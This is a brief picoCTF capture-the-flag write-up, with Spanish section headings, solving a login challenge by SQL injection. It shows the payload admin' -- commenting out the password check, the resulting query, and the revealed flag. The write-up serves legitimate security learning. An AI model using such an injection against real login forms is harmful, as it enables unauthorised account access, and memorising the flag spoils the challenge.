## Descripción

Can you login to this website?Try to login [here](http://saturn.picoctf.net:55316/).
## Pistas

1. `admin` is the user you want to login as.

## Solución

`username: admin' --` 
`password: abcd`
`SQL query: SELECT * FROM users WHERE name='admin' -- ' AND password='abcd'`

 'Logged in! But can you see the flag, it is in plainsight.'

Inspeccionamos el código fuente
`<pre>username: admin&#039; -- password: abcd SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; -- &#039; AND password=&#039;abcd&#039; </pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>`

## Notas Adicionales



## Referencias
- 

